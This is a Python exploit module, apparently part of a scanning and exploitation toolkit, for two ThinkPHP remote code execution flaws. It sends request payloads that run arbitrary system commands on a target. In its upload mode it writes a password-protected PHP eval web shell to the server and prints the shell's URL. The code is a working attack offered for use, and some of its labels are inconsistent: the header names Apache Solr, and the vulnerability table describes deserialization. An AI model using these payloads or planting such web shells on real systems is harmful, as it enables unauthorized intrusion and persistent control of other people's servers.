import requests,platform
from ClassCongregation import _urlparse
from requests_toolbelt.utils import dump
import CodeTest
################
##--ApacheSolr--##
#cve_2018_20062 命令执行
#cve_2019_9082  CMD = upload
################
#VULN = None => 漏洞测试
#VULN = True => 命令执行
CodeTest.VULN = None
TIMEOUT = 10
class ThinkPHP():
    def __init__(self, url, CMD):
        self.url = url
        self.CMD = CMD
        self.payload_cve_2018_20062 = "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=RECOMMAND"
        self.payload_cve_2019_9082 = ("/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&"
            "vars[0]=system&vars[1][]=RECOMMAND")
        self.payload_cve_2019_9082_webshell = ("/index.php/?s=/index/\\think\\app/invokefunction&function="
            "call_user_func_array&vars[0]=file_put_contents&vars[1][]=FILENAME&vars[1][]=<?php%20eval"
            "(@$_POST[%27SHELLPASS%27]);?>")
    
    def cve_2018_20062(self):
        self.pocname = "ThinkPHP: CVE-2018-20062"
        self.info = CodeTest.Colored_.rce()
        self.payload = self.payload_cve_2018_20062.replace("RECOMMAND", self.CMD)
        self.path = "/index.php?s=captcha"
        self.method = "post"
        self.rawdata = "null"
        try:
            self.request = requests.post(self.url + self.path, data=self.payload, headers=CodeTest.headers, timeout=TIMEOUT, verify=False)
            self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
            CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            CodeTest.verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            CodeTest.verify.connection_output(self.pocname)
        except Exception as error:
            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)           
      
    def cve_2019_9082(self):
        self.pocname = "ThinkPHP: CVE-2019-9082"
        self.info = CodeTest.Colored_.rce()
        self.payload = self.payload_cve_2019_9082.replace("RECOMMAND", self.CMD)
        self.method = "get"
        self.rawdata = "null"
        try:
            self.request = requests.get(self.url + self.payload, headers=CodeTest.headers, timeout=TIMEOUT, verify=False)
            self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
            if self.CMD == "upload":
                if os_check() == "linux" or os_check() == "other":
                    self.filename = "vulmap.php"
                    self.shellpass = "123456"
                elif os_check() == "windows": 
                    self.filename = "vulmap.php"
                    self.shellpass = "123456"
                self.payload = self.payload_cve_2019_9082_webshell.replace("FILENAME", self.filename).replace("SHELLPASS", self.shellpass)
                self.request = requests.get(self.url + self.payload, headers=CodeTest.headers, timeout=TIMEOUT, verify=False)
                self.r = "WebShell: " + self.url + "/" + self.filename
                CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
            
            CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            CodeTest.verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            CodeTest.verify.connection_output(self.pocname)
        except Exception as error:
            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
def os_check():
    if platform.system().lower() == 'windows':
        return "windows"
    elif platform.system().lower() == 'linux':
        return "linux"
    else:
        return "other"

print("""eg: http://47.101.167.237/
+-------------------+------------------+-----+-----+-------------------------------------------------------------+
| Target type       | Vuln Name        | Poc | Exp | Impact Version && Vulnerability description                 |
+-------------------+------------------+-----+-----+-------------------------------------------------------------+
| ThinkPHP          | cve_2018_20062   |  Y  |  Y  | < 3.2.4, thinkphp rememberme deserialization rce            |
| ThinkPHP          | cve_2019_9082    |  Y  |  Y  | <= 5.0.23, 5.1.31, thinkphp rememberme deserialization rce  |
+-------------------+------------------+-----+-----+-------------------------------------------------------------+""")
def check(**kwargs):
    if CodeTest.VULN == None:
        ExpThinkPHP = ThinkPHP(_urlparse(kwargs['url']),"echo VuLnEcHoPoCSuCCeSS")
        #ExpThinkPHP = ThinkPHP(kwargs['url'],"echo VuLnEcHoPoCSuCCeSS")
    else:
        ExpThinkPHP = ThinkPHP(_urlparse(kwargs['url']),kwargs['cmd'])
    if kwargs['pocname'] == "cve_2018_20062":
        ExpThinkPHP.cve_2018_20062()
    elif kwargs['pocname'] == "cve_2019_9082":
        ExpThinkPHP.cve_2019_9082()
    else:
        ExpThinkPHP.cve_2018_20062()
        ExpThinkPHP.cve_2019_9082()





